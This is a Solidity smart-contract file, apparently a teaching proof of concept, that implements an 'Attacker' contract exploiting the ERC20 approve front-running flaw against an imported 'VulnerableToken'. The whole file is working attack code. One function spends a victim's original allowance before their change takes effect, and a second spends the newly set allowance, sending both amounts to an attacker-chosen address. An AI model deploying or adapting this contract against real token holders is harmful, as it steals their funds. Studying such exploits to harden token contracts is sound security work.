// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./VulnerableToken.sol";

/**
 * @title Attacker
 * @dev Contract that demonstrates how to exploit the ERC20 approval front-running vulnerability
 */
contract Attacker {
    VulnerableToken public token;
    address public owner;
    
    event Attack(address indexed victim, uint256 originalAllowance, uint256 newAllowance, uint256 stolenAmount);
    
    constructor(address _tokenAddress) {
        token = VulnerableToken(_tokenAddress);
        owner = msg.sender;
    }
    
    /**
     * @dev Execute the front-running attack
     * @param victim Address of the token owner who is changing the allowance
     * @param originalAllowance The current/original allowance before the victim changes it
     * @param destination Address where stolen tokens will be sent
     */
    function executeAttack(
        address victim,
        uint256 originalAllowance,
        address destination
    ) external {
        require(msg.sender == owner, "Only owner can execute attack");
        
        // Check that we indeed have this allowance
        require(token.allowance(victim, address(this)) >= originalAllowance, "Insufficient allowance");
        
        // Use the original allowance before it gets changed
        token.transferFrom(victim, destination, originalAllowance);
        
        // At this point, victim's transaction to change allowance would execute
        // after our transaction, setting the allowance to the new value rather
        // than reducing it to (newAllowance - originalAllowance)
        
        emit Attack(victim, originalAllowance, token.allowance(victim, address(this)), originalAllowance);
    }
    
    /**
     * @dev Execute the second part of the attack, after victim has changed the allowance
     * @param victim Address of the token owner who changed the allowance
     * @param destination Address where stolen tokens will be sent
     */
    function executeSecondAttack(
        address victim,
        address destination
    ) external {
        require(msg.sender == owner, "Only owner can execute attack");
        
        uint256 newAllowance = token.allowance(victim, address(this));
        require(newAllowance > 0, "No allowance to exploit");
        
        // Use the new allowance that victim set, effectively getting
        // both original and new allowance amounts
        token.transferFrom(victim, destination, newAllowance);
        
        emit Attack(victim, 0, newAllowance, newAllowance);
    }
} 